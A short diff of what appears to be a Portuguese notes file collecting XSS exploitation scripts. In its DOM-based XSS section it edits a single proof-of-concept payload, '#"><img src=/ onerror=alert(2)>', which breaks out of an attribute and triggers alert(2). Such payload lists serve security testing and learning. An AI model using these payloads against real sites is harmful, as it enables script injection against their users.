@@ -37,6 +37,6 @@ Vários scripts voltados a exploração da vulnerabilidade XSS
 # DomBased XSS
   // obs: Utilizar a extensão DOM Invader
   
-#"><img src=/ onerror=alert(2)>
+123#"><img src=/ onerror=alert(2)>123
 
 
